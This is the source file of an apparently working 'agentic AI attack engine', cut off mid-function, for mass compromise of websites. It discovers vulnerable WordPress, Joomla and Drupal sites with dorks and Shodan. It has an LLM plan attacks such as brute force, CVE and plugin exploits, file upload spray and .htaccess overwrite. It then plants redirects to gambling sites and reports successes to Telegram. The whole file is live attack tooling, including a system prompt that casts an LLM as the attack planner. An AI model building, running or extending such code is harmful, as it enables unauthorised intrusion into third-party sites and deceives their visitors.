/**
 * Agentic AI Attack Engine — Fully Autonomous Attack System
 * 
 * The AI does EVERYTHING autonomously:
 *   Phase 1: Discover vulnerable targets (Google dorks, Shodan, NVD CVE matching)
 *   Phase 2: Analyze each target (CMS, WAF, vulns, attack surface)
 *   Phase 3: Attack with ALL methods in priority order until success
 *   Phase 4: Verify success (file placed + redirect working)
 *   Phase 5: Send Telegram notification on verified success only
 *   Phase 6: Move to next target, repeat
 * 
 * Uses ALL existing modules:
 *   - mass-target-discovery (Shodan + SerpAPI)
 *   - wp-vuln-scanner + cms-vuln-scanner
 *   - waf-detector + ai-exploit-generator
 *   - unified-attack-pipeline (full attack)
 *   - one-click-deploy
 *   - telegram-notifier
 */
import { getDb } from "./db";
import { agenticSessions, redirectUrlPool, autonomousDeploys } from "../drizzle/schema";
import { eq, desc, and, sql } from "drizzle-orm";
import { runMassDiscovery, type DiscoveryConfig, type DiscoveredTarget } from "./mass-target-discovery";
import { getQueuedTargets, updateTargetStatus } from "./keyword-target-discovery";
import { startBackgroundJob, getJobStatus } from "./job-runner";
import { sendTelegramNotification } from "./telegram-notifier";
import { invokeLLM } from "./_core/llm";
import {
  orchestrateRetry,
  ALL_ATTACK_METHODS,
  type AttackAttemptRecord,
  type TargetContext,
  recordAttackOutcome,
  type AttackOutcome,
} from "./ai-attack-strategist";
import { runLearningCycle, runEnhancedLearningCycle, queryHistoricalPatterns, calculateMethodSuccessRates, getCmsAttackProfile } from "./adaptive-learning";
import type { HistoricalPattern, MethodSuccessRate } from "./adaptive-learning";
import { isBlacklisted, isOwnRedirectUrl, recordFailedAttack, recordSuccessfulAttack, filterTargets } from "./attack-blacklist";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════
export interface AgenticConfig {
  userId: number;
  mode: "full_auto" | "semi_auto" | "discovery_only";
  redirectUrls?: string[];       // Override redirect URLs (otherwise use DB pool)
  targetCms?: string[];          // Filter: only attack these CMS types
  maxTargetsPerRun?: number;     // Max targets to discover (default 50)
  maxConcurrent?: number;        // Max concurrent attacks (default 3)
  seoKeywords?: string[];
  customDorks?: string[];        // Custom Google dork queries
  enableWafBypass?: boolean;
  enableAiExploit?: boolean;
  enableCloaking?: boolean;
  maxRetriesPerTarget?: number;  // Max AI-powered retries per target (default 3)
}

export interface AgenticEvent {
  phase: string;
  detail: string;
  progress: number;
  timestamp: number;
  data?: Record<string, unknown>;
}

interface AgenticState {
  sessionId: number;
  status: "running" | "paused" | "completed" | "stopped" | "error";
  events: AgenticEvent[];
  abortController: AbortController;
}

// ═══════════════════════════════════════════════════════
//  IN-MEMORY SESSION TRACKING
// ═══════════════════════════════════════════════════════
const activeSessions = new Map<number, AgenticState>();

// ═══════════════════════════════════════════════════════
//  REDIRECT URL POOL MANAGEMENT
// ═══════════════════════════════════════════════════════
const DEFAULT_REDIRECT_URL = "https://hkt956.org/";

export async function getRedirectUrls(): Promise<string[]> {
  try {
    const db = await getDb();
    if (!db) return [DEFAULT_REDIRECT_URL];
    
    const urls = await db.select()
      .from(redirectUrlPool)
      .where(eq(redirectUrlPool.isActive, true))
      .orderBy(desc(redirectUrlPool.weight));
    
    if (urls.length === 0) return [DEFAULT_REDIRECT_URL];
    return urls.map(u => u.url);
  } catch {
    return [DEFAULT_REDIRECT_URL];
  }
}

export async function pickRedirectUrl(urls?: string[]): Promise<string> {
  const pool = urls && urls.length > 0 ? urls : await getRedirectUrls();
  if (pool.length === 0) return DEFAULT_REDIRECT_URL;
  if (pool.length === 1) return pool[0];
  
  // Weighted random selection from DB pool
  try {
    const db = await getDb();
    if (db && (!urls || urls.length === 0)) {
      const dbUrls = await db.select()
        .from(redirectUrlPool)
        .where(eq(redirectUrlPool.isActive, true));
      
      if (dbUrls.length > 0) {
        const totalWeight = dbUrls.reduce((sum, u) => sum + u.weight, 0);
        let random = Math.random() * totalWeight;
        for (const u of dbUrls) {
          random -= u.weight;
          if (random <= 0) {
            // Update lastUsedAt
            await db.update(redirectUrlPool)
              .set({ lastUsedAt: new Date() })
              .where(eq(redirectUrlPool.id, u.id));
            return u.url;
          }
        }
        return dbUrls[0].url;
      }
    }
  } catch { /* fallback */ }
  
  // Simple random from array
  return pool[Math.floor(Math.random() * pool.length)];
}

export async function updateRedirectStats(url: string, success: boolean) {
  try {
    const db = await getDb();
    if (!db) return;
    
    if (success) {
      await db.update(redirectUrlPool)
        .set({ successCount: sql`${redirectUrlPool.successCount} + 1` })
        .where(eq(redirectUrlPool.url, url));
    } else {
      await db.update(redirectUrlPool)
        .set({ failCount: sql`${redirectUrlPool.failCount} + 1` })
        .where(eq(redirectUrlPool.url, url));
    }
  } catch { /* best-effort */ }
}

// ═══════════════════════════════════════════════════════
//  REDIRECT URL CRUD
// ═══════════════════════════════════════════════════════
export async function addRedirectUrl(url: string, label?: string, weight?: number, isDefault?: boolean) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  
  // If setting as default, unset all others first
  if (isDefault) {
    await db.update(redirectUrlPool)
      .set({ isDefault: false })
      .where(eq(redirectUrlPool.isDefault, true));
  }
  
  const [result] = await db.insert(redirectUrlPool).values({
    url,
    label: label || new URL(url).hostname,
    weight: weight || 1,
    isDefault: isDefault || false,
    isActive: true,
  });
  
  return { id: (result as any).insertId, url, label, weight };
}

export async function removeRedirectUrl(id: number) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  await db.delete(redirectUrlPool).where(eq(redirectUrlPool.id, id));
  return { success: true };
}

export async function listRedirectUrls() {
  const db = await getDb();
  if (!db) return [];
  return db.select().from(redirectUrlPool).orderBy(desc(redirectUrlPool.weight));
}

export async function updateRedirectUrl(id: number, updates: { url?: string; label?: string; weight?: number; isActive?: boolean; isDefault?: boolean }) {
  const db = await getDb();
  if (!db) throw new Error("DB not available");
  
  if (updates.isDefault) {
    await db.update(redirectUrlPool)
      .set({ isDefault: false })
      .where(eq(redirectUrlPool.isDefault, true));
  }
  
  await db.update(redirectUrlPool)
    .set({ ...updates, updatedAt: new Date() })
    .where(eq(redirectUrlPool.id, id));
  return { success: true };
}

// ═══════════════════════════════════════════════════════
//  AI STRATEGY PLANNER — LLM decides attack order
// ═══════════════════════════════════════════════════════
async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
  attackOrder: string[];
  reasoning: string;
  estimatedSuccess: number;
}> {
  // ═══ ADAPTIVE LEARNING: Gather historical intelligence ═══
  let historicalContext: Record<string, unknown> = {};
  let blacklistedMethods: string[] = [];
  try {
    const [cmsPatterns, wafPatterns, globalRates, cmsProfile] = await Promise.all([
      target.cms ? queryHistoricalPatterns({ cms: target.cms }) : Promise.resolve([]),
      target.waf ? queryHistoricalPatterns({ waf: target.waf }) : Promise.resolve([]),
      calculateMethodSuccessRates({ minAttempts: 2 }),
      target.cms ? getCmsAttackProfile(target.cms) : Promise.resolve(null),
    ]);

    // ═══ METHOD BLACKLIST: Skip methods that consistently fail for this target profile ═══
    const FAIL_THRESHOLD = 5;   // min attempts before blacklisting
    const FAIL_RATE_LIMIT = 10; // blacklist if success rate < 10%
    const relevantPatterns = target.cms ? cmsPatterns : globalRates.map(r => ({
      method: r.method, totalAttempts: r.attempts, totalSuccesses: r.successes,
      successRate: r.successRate, avgDuration: r.avgDuration, commonErrors: [], bestPayloadMods: [], bestWafBypasses: [],
    }));
    blacklistedMethods = relevantPatterns
      .filter(p => p.totalAttempts >= FAIL_THRESHOLD && p.successRate < FAIL_RATE_LIMIT)
      .map(p => p.method);

    if (blacklistedMethods.length > 0) {
      console.log(`[Agentic] 🚫 Blacklisted methods for ${target.domain} (${target.cms || "unknown"}): ${blacklistedMethods.join(", ")}`);
    }

    // Build ranked method list from historical success rates
    const methodRankings = globalRates
      .filter((r: MethodSuccessRate) => !blacklistedMethods.includes(r.method))
      .sort((a: MethodSuccessRate, b: MethodSuccessRate) => b.successRate - a.successRate)
      .slice(0, 15);

    historicalContext = {
      cmsPatterns: cmsPatterns.slice(0, 8).map((p: HistoricalPattern) => ({
        method: p.method, successRate: p.successRate, attempts: p.totalAttempts,
        commonErrors: p.commonErrors.slice(0, 3), bestBypasses: p.bestWafBypasses.slice(0, 3),
      })),
      wafPatterns: wafPatterns.slice(0, 5).map((p: HistoricalPattern) => ({
        method: p.method, successRate: p.successRate, attempts: p.totalAttempts,
      })),
      globalMethodRankings: methodRankings.slice(0, 10).map((r: MethodSuccessRate) => ({
        method: r.method, successRate: r.successRate, attempts: r.attempts,
      })),
      cmsProfile: cmsProfile ? {
        bestMethod: cmsProfile.bestMethod,
        overallSuccessRate: Number(cmsProfile.overallSuccessRate),
        methodRankings: (cmsProfile.methodRankings as any[])?.slice(0, 5),
      } : null,
      blacklistedMethods,
      blacklistReason: `Methods with <${FAIL_RATE_LIMIT}% success rate after ${FAIL_THRESHOLD}+ attempts`,
    };
  } catch (e: any) {
    console.warn(`[Agentic] Historical data fetch failed: ${e.message}`);
  }

  // ═══ Available methods (minus blacklisted) ═══
  const allMethods = [
    "cve_exploit", "wp_brute_force", "cms_plugin_exploit", "file_upload_spray",
    "config_exploit", "xmlrpc_attack", "rest_api_exploit", "ftp_brute",
    "webdav_upload", "htaccess_overwrite", "wp_admin_takeover",
    "shellless_redirect", "ai_generated_exploit",
  ];
  const availableMethods = allMethods.filter(m => !blacklistedMethods.includes(m));

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert penetration tester AI with access to historical attack data.
Given a target's fingerprint AND historical success/failure data, plan the optimal attack strategy.

CRITICAL RULES:
1. NEVER recommend methods from the blacklistedMethods list — they have proven failure rates.
2. Prioritize methods with the HIGHEST historical success rates for similar targets (same CMS/WAF).
3. If a CMS profile exists with a bestMethod, strongly prefer that method.
4. If no historical data exists, use standard heuristics based on target fingerprint.
5. Order methods from most likely to succeed to least likely.

Return JSON: { "attackOrder": ["method1", "method2", ...], "reasoning": "...", "estimatedSuccess": 0-100 }
Only use methods from the availableMethods list.`
        },
        {
          role: "user",
          content: JSON.stringify({
            target: {
              domain: target.domain,
              cms: target.cms,
              cmsVersion: target.cmsVersion,
              serverType: target.serverType,
              phpVersion: target.phpVersion,
              waf: target.waf,
              hasOpenUpload: target.hasOpenUpload,
              hasExposedConfig: target.hasExposedConfig,
              hasExposedAdmin: target.hasExposedAdmin,
              hasWritableDir: target.hasWritableDir,
              hasVulnerableCms: target.hasVulnerableCms,
              hasWeakAuth: target.hasWeakAuth,
              vulnScore: target.vulnScore,
              attackDifficulty: target.attackDifficulty,
            },
            availableMethods,
            historicalData: historicalContext,
          })
        }
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_strategy",
          strict: true,
          schema: {
            type: "object",
            properties: {
              attackOrder: { type: "array", items: { type: "string" } },
              reasoning: { type: "string" },
              estimatedSuccess: { type: "integer" },
            },
            required: ["attackOrder", "reasoning", "estimatedSuccess"],
            additionalProperties: false,
          },
        },
      },
    });
    
    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      // Double-check: remove any blacklisted methods that LLM might have included
      parsed.attackOrder = (parsed.attackOrder as string[]).filter(
        (m: string) => !blacklistedMethods.includes(m)
      );
      // Ensure at least some methods remain
      if (parsed.attackOrder.length === 0) {
        parsed.attackOrder = availableMethods.slice(0, 5);
      }
      return parsed;
    }
  } catch (e: any) {
    console.error(`[Agentic] AI strategy planning failed: ${e.message}`);
  }
  
  // Fallback strategy — use available methods (already filtered)
  return {
    attackOrder: availableMethods.length > 0 ? availableMethods : allMethods.slice(0, 5),
    reasoning: "Fallback: using available methods sorted by general effectiveness, blacklisted methods excluded",
    estimatedSuccess: 25,
  };
}

// ═══════════════════════════════════════════════════════
//  MAIN: START AGENTIC SESSION
// ═══════════════════════════════════════════════════════
export async function startAgenticSession(config: AgenticConfig): Promise<{ sessionId: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  // Ensure at least one redirect URL exists
  const redirectUrls = config.redirectUrls && config.redirectUrls.length > 0
    ? config.redirectUrls
    : await getRedirectUrls();
  
  // Create session record
  const [result] = await db.insert(agenticSessions).values({
    userId: config.userId,
    status: "running",
    mode: config.mode,
    redirectUrls: redirectUrls,
    targetCms: config.targetCms || null,
    maxTargetsPerRun: config.maxTargetsPerRun || 50,
    maxConcurrent: config.maxConcurrent || 3,
    seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
    customDorks: config.customDorks || null,
    currentPhase: "initializing",
  } as any);
  
  const sessionId = (result as any).insertId;
  if (!sessionId) throw new Error("Failed to create agentic session");
  
  // Set up abort controller
  const abortController = new AbortController();
  const state: AgenticState = {
    sessionId,
    status: "running",
    events: [],
    abortController,
  };
  activeSessions.set(sessionId, state);
  
  // Run the agentic loop in background
  runAgenticLoop(sessionId, config, redirectUrls, state).catch(async (e) => {
    console.error(`[Agentic] Session ${sessionId} fatal error:`, e.message);
    await updateSessionStatus(sessionId, "error", e.message);
    activeSessions.delete(sessionId);
  });
  
  return { sessionId };
}

// ═══════════════════════════════════════════════════════
//  AGENTIC LOOP — The AI brain that runs everything
// ═══════════════════════════════════════════════════════
async function runAgenticLoop(
  sessionId: number,
  config: AgenticConfig,
  redirectUrls: string[],
  state: AgenticState,
) {
  const signal = state.abortController.signal;
  const maxTargets = config.maxTargetsPerRun || 50;
  const maxConcurrent = config.maxConcurrent || 3;
  
  const emitEvent = async (phase: string, detail: string, progress: number, data?: Record<string, unknown>) => {
    const event: AgenticEvent = { phase, detail, progress, timestamp: Date.now(), data };
    state.events.push(event);
    // Keep only last 500 events in memory
    if (state.events.length > 500) state.events = state.events.slice(-500);
    // Update DB
    try {
      const db = await getDb();
      if (db) {
        await db.update(agenticSessions)
          .set({
            currentPhase: phase,
            lastActivityAt: new Date(),
            eventsLog: state.events.slice(-100),
          })
          .where(eq(agenticSessions.id, sessionId));
      }
    } catch { /* best-effort */ }
  };
  
  try {
    // ═══════════════════════════════════════════════
    // PHASE 1: DISCOVER TARGETS
    // ═══════════════════════════════════════════════
    await emitEvent("discovery", "🔍 Phase 1: AI กำลังค้นหาเป้าหมายที่มีช่องโหว่...", 5);
    
    if (signal.aborted) throw new Error("Session stopped by user");
    
    // Build custom dork queries based on CMS filter
    const customQueries = config.customDorks || [];
    if (config.targetCms?.includes("wordpress")) {
      customQueries.push(
        'inurl:wp-content/uploads intitle:"index of"',
        'inurl:wp-admin/install.php',
        'inurl:wp-content/plugins site:.com',
      );
    }
    if (config.targetCms?.includes("joomla")) {
      customQueries.push(
        'inurl:administrator/index.php "Joomla"',
        'inurl:components/com_media',
      );
    }
    if (config.targetCms?.includes("drupal")) {
      customQueries.push(
        'inurl:user/login "Powered by Drupal"',
        'inurl:sites/default/files',
      );
    }
    
    const discoveryConfig: DiscoveryConfig = {
      useShodan: true,
      useSerpApi: true,
      customQueries: customQueries.length > 0 ? customQueries : undefined,
      minVulnScore: 25,
      maxTargets: maxTargets,
      targetCms: config.targetCms,
      onProgress: (phase, detail, progress) => {
        emitEvent("discovery", `🔍 ${detail}`, Math.min(25, 5 + progress * 0.2));
      },
    };
    
    // ═══ KEYWORD DISCOVERY TARGETS (SerpAPI lottery keywords) ═══
    let keywordTargets: DiscoveredTarget[] = [];
    try {
      const kwTargets = await getQueuedTargets(Math.min(maxTargets, 30));
      if (kwTargets.length > 0) {
        await emitEvent("discovery", `🎯 พบ ${kwTargets.length} เป้าหมายจาก Keyword Discovery (SerpAPI)`, 8);
        keywordTargets = kwTargets.map((kt, idx) => ({
          id: `kw-${kt.id}`,
          domain: kt.domain,
          url: kt.url,
          source: "serpapi" as const,
          sourceQuery: kt.keyword,
          category: "keyword_discovery",
          hasOpenUpload: false,
          hasExposedConfig: false,
          hasExposedAdmin: false,
          hasWritableDir: false,
          hasVulnerableCms: false,
          hasWeakAuth: false,
          vulnScore: 50 - (kt.serpPosition ?? 50), // Higher SERP = lower score
          attackDifficulty: "medium" as const,
          estimatedSuccessRate: 30,
          priorityRank: idx + 1,
          discoveredAt: Date.now(),
          status: "new" as const,
          notes: [`From keyword: ${kt.keyword}`, `SERP position: ${kt.serpPosition ?? "N/A"}`],
          _keywordTargetId: kt.id, // Track for status update
        }));
        // Mark as attacking
        for (const kt of kwTargets) {
          await updateTargetStatus(kt.id, "attacking").catch(() => {});
        }
      }
    } catch (e: any) {
      await emitEvent("discovery", `⚠️ Keyword discovery targets error: ${e.message}`, 8);
    }

    let discoveryResult;
    try {
      discoveryResult = await runMassDiscovery(discoveryConfig);
    } catch (e: any) {
      await emitEvent("discovery", `⚠️ Discovery error: ${e.message}`, 10);
      discoveryResult = { targets: [], errors: [e.message], totalQueriesRun: 0, totalRawResults: 0, totalAfterDedup: 0, totalAfterFilter: 0, totalScored: 0, id: "", startedAt: Date.now(), status: "error" as const };
    }
    
    // Merge keyword targets with mass discovery targets (keyword targets first)
    const rawTargets = [
      ...keywordTargets,
      ...discoveryResult.targets,
    ]
      .sort((a, b) => b.vulnScore - a.vulnScore)
      .slice(0, maxTargets);
    
    // ═══ BLACKLIST + SELF-ATTACK FILTER ═══
    const { allowed: filteredTargets, blocked: blockedTargets } = await filterTargets(
      rawTargets,
      redirectUrls,
    );
    
    if (blockedTargets.length > 0) {
      await emitEvent("discovery", `🚫 กรองออก ${blockedTargets.length} เป้าหมาย (blacklisted/self-redirect): ${blockedTargets.slice(0, 3).map(b => `${b.target.domain}: ${b.reason}`).join(", ")}`, 20, {
        blockedCount: blockedTargets.length,
        blocked: blockedTargets.slice(0, 10).map(b => ({ domain: b.target.domain, reason: b.reason })),
      });
    }
    
    const targets = filteredTargets as DiscoveredTarget[];
    
    await emitEvent("discovery", `✅ ค้นพบ ${targets.length} เป้าหมาย (จาก ${discoveryResult.totalRawResults} ดิบ, กรองออก ${blockedTargets.length})`, 25, {
      totalFound: targets.length,
      totalRaw: discoveryResult.totalRawResults,
      topTargets: targets.slice(0, 5).map(t => ({ domain: t.domain, cms: t.cms, score: t.vulnScore })),
    });
    
    // Update session stats
    try {
      const db = await getDb();
      if (db) {
        await db.update(agenticSessions)
          .set({ targetsDiscovered: targets.length })
          .where(eq(agenticSessions.id, sessionId));
      }
    } catch { /* best-effort */ }
    
    if (targets.length === 0) {
      await emitEvent("complete", "❌ ไม่พบเป้าหมายที่มีช่องโหว่ — ลองเปลี่ยน dork queries หรือ CMS filter", 100);
      await updateSessionStatus(sessionId, "completed", "No targets found");
      return;
    }
    
    if (config.mode === "discovery_only") {
      await emitEvent("complete", `✅ Discovery Only — พบ ${targets.length} เป้าหมาย`, 100, {
        targets: targets.map(t => ({ domain: t.domain, cms: t.cms, score: t.vulnScore, difficulty: t.attackDifficulty })),
      });
      await updateSessionStatus(sessionId, "completed", `Found ${targets.length} targets`);
      return;
    }
    
    // ═══════════════════════════════════════════════
    // PHASE 2-5: ATTACK EACH TARGET
    // ═══════════════════════════════════════════════
    let successCount = 0;
    let failCount = 0;
    let attackedCount = 0;
    
    // Process targets in batches of maxConcurrent
    for (let i = 0; i < targets.length; i += maxConcurrent) {
      if (signal.aborted) throw new Error("Session stopped by user");
      
      const batch = targets.slice(i, i + maxConcurrent);
      const batchNum = Math.floor(i / maxConcurrent) + 1;
      const totalBatches = Math.ceil(targets.length / maxConcurrent);
      
      await emitEvent("attacking", `⚔️ Batch ${batchNum}/${totalBatches}: กำลังโจมตี ${batch.length} เป้าหมาย...`, 25 + (i / targets.length) * 65, {
        batch: batchNum,
        targets: batch.map(t => t.domain),
      });
      
      // Attack each target in the batch concurrently
      const batchPromises = batch.map(async (target) => {
        if (signal.aborted) return { target, success: false, reason: "stopped" };
        
        try {
          return await attackSingleTarget(sessionId, target, config, redirectUrls, state, emitEvent, { totalAttacked: attackedCount, totalSucceeded: successCount, totalFailed: failCount });
        } catch (e: any) {
          return { target, success: false, reason: e.message };
        }
      });
      
      const batchResults = await Promise.all(batchPromises);
      
      for (const result of batchResults) {
        attackedCount++;
        if (result.success) {
          successCount++;
        } else {
          failCount++;
        }
        // Update keyword discovery target status if applicable
        const kwTargetId = (result.target as any)?._keywordTargetId;
        if (kwTargetId) {
          updateTargetStatus(kwTargetId, result.success ? "success" : "failed", {
            attackSessionId: sessionId,
            attackResult: result.success ? "Attack succeeded" : (result.reason || "Attack failed"),
          }).catch(() => {});
        }
      }
      
      // Update session stats
      try {
        const db = await getDb();
        if (db) {
          await db.update(agenticSessions)
            .set({
              targetsAttacked: attackedCount,
              targetsSucceeded: successCount,
              targetsFailed: failCount,
              lastActivityAt: new Date(),
            })
            .where(eq(agenticSessions.id, sessionId));
        }
      } catch { /* best-effort */ }
      
      // Small delay between batches
      if (i + maxConcurrent < targets.length) {
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
    }
    
    // ═══════════════════════════════════════════════
    // PHASE 6: COMPLETE — SUMMARY
    // ═══════════════════════════════════════════════
    const summaryText = `🏁 Agentic Attack Complete!\n` +
      `📊 ${attackedCount} targets attacked\n` +
      `✅ ${successCount} succeeded (${Math.round(successCount / Math.max(attackedCount, 1) * 100)}%)\n` +
      `❌ ${failCount} failed`;
    
    await emitEvent("complete", summaryText, 100, {
      totalAttacked: attackedCount,
      totalSucceeded: successCount,
      totalFailed: failCount,
      successRate: Math.round(successCount / Math.max(attackedCount, 1) * 100),
    });
    
    await updateSessionStatus(sessionId, "completed", summaryText);

    // ═══ ADAPTIVE LEARNING: Run learning cycle after session completes ═══
    if (attackedCount >= 3) {
      await emitEvent("learning", "🧠 AI กำลังเรียนรู้จากผลลัพธ์ของ session นี้...", 100);
      try {
        const learningResult = await runEnhancedLearningCycle();
        await emitEvent("learned", `📚 Adaptive Learning: อัพเดท ${learningResult.patternsUpdated} patterns, ${learningResult.profilesUpdated} CMS profiles, ${learningResult.strategiesEvolved} strategies evolved`, 100, learningResult);
      } catch (e: any) {
        console.error(`[AdaptiveLearning] Post-session learning cycle error: ${e.message}`);
      }
    }
    
    // Send summary to Telegram if there were successes
    if (successCount > 0) {
      try {
        await sendTelegramNotification({
          type: "success",
          targetUrl: `Agentic Session #${sessionId}`,
          redirectUrl: redirectUrls[0] || DEFAULT_REDIRECT_URL,
          deployedUrls: [],
          shellType: "redirect_php",
          duration: Date.now() - (state.events[0]?.timestamp || Date.now()),
          errors: [],
          keywords: config.seoKeywords || [],
          cloakingEnabled: false,
          injectedFiles: successCount,
          details: `🤖 AGENTIC AI SUMMARY\n${summaryText}`,
        });
      } catch { /* best-effort */ }
    }
    
  } catch (e: any) {
    if (e.message === "Session stopped by user") {
      await emitEvent("stopped", "⏹️ Session หยุดโดยผู้ใช้", 100);
      await updateSessionStatus(sessionId, "stopped", "Stopped by user");
    } else {
      await emitEvent("error", `❌ Fatal error: ${e.message}`, 100);
      await updateSessionStatus(sessionId, "error", e.message);
    }
  } finally {
    activeSessions.delete(sessionId);
  }
}

// ═══════════════════════════════════════════════════════
//  ATTACK SINGLE TARGET — Full autonomous attack
// ═══════════════════════════════════════════════════════
async function attackSingleTarget(
  sessionId: number,
  target: DiscoveredTarget,
  config: AgenticConfig,
  redirectUrls: string[],
  state: AgenticState,
  emitEvent: (phase: string, detail: string, progress: number, data?: Record<string, unknown>) => Promise<void>,
  sessionStats?: { totalAttacked: number; totalSucceeded: number; totalFailed: number },
): Promise<{ target: DiscoveredTarget; success: boolean; reason: string; deployId?: number; deployedUrls?: string[] }> {
  
  const maxRetries = config.maxRetriesPerTarget ?? 3;
  const attemptHistory: AttackAttemptRecord[] = [];
  let currentMethodPriority: string[] = [];

  // ═══ RETRY LOOP — AI Strategist drives retries ═══
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    if (state.abortController.signal.aborted) {
      return { target, success: false, reason: "stopped" };
    }

    // ─── If this is a retry (attempt > 0), consult AI Strategist ───
    if (attempt > 0) {
      await emitEvent("ai_retry", `🧠 AI Strategist: วิเคราะห์ความล้มเหลวครั้งที่ ${attempt}/${maxRetries} สำหรับ ${target.domain}...`, 0, {
        domain: target.domain,
        attempt,
        maxRetries,
      });

      const targetCtx: TargetContext = {
        domain: target.domain,
        cms: target.cms || null,
        cmsVersion: target.cmsVersion || null,
        serverType: target.serverType || null,
        phpVersion: target.phpVersion || null,
        wafDetected: target.waf || null,
        wafStrength: null,
        vulnScore: target.vulnScore,
        hasOpenUpload: target.hasOpenUpload,
        hasExposedConfig: target.hasExposedConfig,
        hasExposedAdmin: target.hasExposedAdmin,
        hasWritableDir: target.hasWritableDir,
        hasVulnerableCms: target.hasVulnerableCms,
        hasWeakAuth: target.hasWeakAuth,
        knownCves: target.notes?.filter((n: string) => n.startsWith("CVE-")) || [],
        previousAttempts: attemptHistory,
      };

      const retryResult = await orchestrateRetry(
        targetCtx,
        maxRetries,
        {
          totalTargets: sessionStats?.totalAttacked ?? 0,
          remainingTargets: 0,
          successRate: sessionStats?.totalSucceeded
            ? Math.round((sessionStats.totalSucceeded / Math.max(sessionStats.totalAttacked, 1)) * 100)
            : 0,
          avgTimePerTarget: 0,
        },
        Array.from(ALL_ATTACK_METHODS),
        (event) => {
          emitEvent("ai_retry", `🤖 ${event.detail}`, 0, event.data).catch(() => {});
        },
      );

      if (!retryResult.continueDecision.shouldContinue || !retryResult.strategy?.shouldRetry) {
        await emitEvent("ai_skip", `⏹️ AI Strategist ตัดสินใจหยุดโจมตี ${target.domain}: ${retryResult.aiReasoning}`, 0, {
          domain: target.domain,
          reasoning: retryResult.aiReasoning,
        });
        return { target, success: false, reason: `AI stopped after ${attempt} retries: ${retryResult.aiReasoning}` };
      }

      // AI suggests a new method — reorder priority
      const nextMethod = retryResult.strategy.nextMethod;
      currentMethodPriority = [nextMethod, ...currentMethodPriority.filter((m: string) => m !== nextMethod)];

      await emitEvent("ai_retry", `🎯 AI Strategist: ลองใหม่ด้วย ${nextMethod} (${retryResult.strategy.estimatedSuccessRate}% chance) — ${retryResult.strategy.reasoning}`, 0, {
        domain: target.domain,
        attempt: attempt + 1,
        method: nextMethod,
        estimatedSuccess: retryResult.strategy.estimatedSuccessRate,
      });
    }

    // ─── Pick redirect URL ───
    const redirectUrl = await pickRedirectUrl(redirectUrls);

    if (attempt === 0) {
      await emitEvent("attacking", `🎯 โจมตี ${target.domain} (CMS: ${target.cms || "unknown"}, Score: ${target.vulnScore})`, 0, {
        domain: target.domain,
        cms: target.cms,
        vulnScore: target.vulnScore,
        redirectUrl,
      });
    }

    // ─── Plan strategy (first attempt uses AI planner, retries use strategist) ───
    if (attempt === 0) {
      const strategy = await aiPlanAttackStrategy(target);
      currentMethodPriority = strategy.attackOrder;
      await emitEvent("attacking", `🧠 AI วางแผน: ${strategy.reasoning.substring(0, 100)}... (${strategy.estimatedSuccess}% chance)`, 0, {
        domain: target.domain,
        strategy: strategy.attackOrder,
      });
    }

    // ─── Launch attack ───
    const attackStartTime = Date.now();
    try {
      const jobResult = await startBackgroundJob({
        userId: config.userId,
        targetDomain: target.url || `https://${target.domain}`,
        redirectUrl,
        mode: "emergent",
        maxIterations: 5,
        seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
        enableCloaking: config.enableCloaking,
        methodPriority: currentMethodPriority.map((m: string) => ({ id: m, enabled: true })),
      });

      const deployId = jobResult.deployId;
      const maxWaitMs = 5 * 60 * 1000;
      const pollInterval = 5000;
      const startTime = Date.now();
      let jobFinalStatus = "timeout";
      let jobPhase = "unknown";
      let jobResponseSnippet = "";

      while (Date.now() - startTime < maxWaitMs) {
        if (state.abortController.signal.aborted) {
          return { target, success: false, reason: "stopped", deployId };
        }

        await new Promise(resolve => setTimeout(resolve, pollInterval));

        const status = await getJobStatus(deployId);
        if (!status) continue;

        if (status.status === "success") {
          const verifiedUrls = (status.verifiedUrls as string[]) || [];
          await updateRedirectStats(redirectUrl, true);
          try {
            const db = await getDb();
            if (db) {
              await db.update(agenticSessions)
                .set({ totalRedirectsPlaced: sql`${agenticSessions.totalRedirectsPlaced} + ${verifiedUrls.length}` })
                .where(eq(agenticSessions.id, sessionId));
            }
          } catch { /* best-effort */ }

          // ═══ BLACKLIST: Clear on success ═══
          recordSuccessfulAttack(target.domain).catch(() => {});

          await emitEvent("success", `✅ ${target.domain} — สำเร็จ! ${verifiedUrls.length} files placed, redirect → ${redirectUrl}${attempt > 0 ? ` (retry #${attempt})` : ""}`, 0, {
            domain: target.domain,
            deployId,
            verifiedUrls,
            redirectUrl,
            retryAttempt: attempt,
          });

          // ═══ ADAPTIVE LEARNING: Record SUCCESS ═══
          recordAttackOutcome({
            targetDomain: target.domain,
            cms: target.cms || null,
            cmsVersion: target.cmsVersion || null,
            serverType: target.serverType || null,
            phpVersion: target.phpVersion || null,
            wafDetected: target.waf || null,
            wafStrength: null,
            vulnScore: target.vulnScore || null,
            method: currentMethodPriority[0] || "unified_pipeline",
            exploitType: "multi_step",
            payloadType: null,
            wafBypassUsed: [],
            payloadModifications: [],
            attackPath: null,
            attemptNumber: attempt + 1,
            isRetry: attempt > 0,
            previousMethodsTried: attemptHistory.map(a => a.method),
            success: true,
            httpStatus: 200,
            errorCategory: null,
            errorMessage: null,
            filesPlaced: verifiedUrls.length,
            redirectVerified: true,
            durationMs: Date.now() - attackStartTime,
            aiFailureCategory: null,
            aiReasoning: null,
            aiConfidence: null,
            aiEstimatedSuccess: null,
            sessionId: deployId,
            agenticSessionId: sessionId,
          }).catch((e) => console.error(`[AdaptiveLearning] record success error: ${e.message}`));

          return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
        }

        if (status.status === "failed" || status.status === "partial") {
          await updateRedirectStats(redirectUrl, false);
          jobFinalStatus = status.status;
          jobPhase = status.liveProgress?.phase || "unknown";
          break; // Exit poll loop — will be retried by AI
        }

        if (status.liveProgress?.phase) {
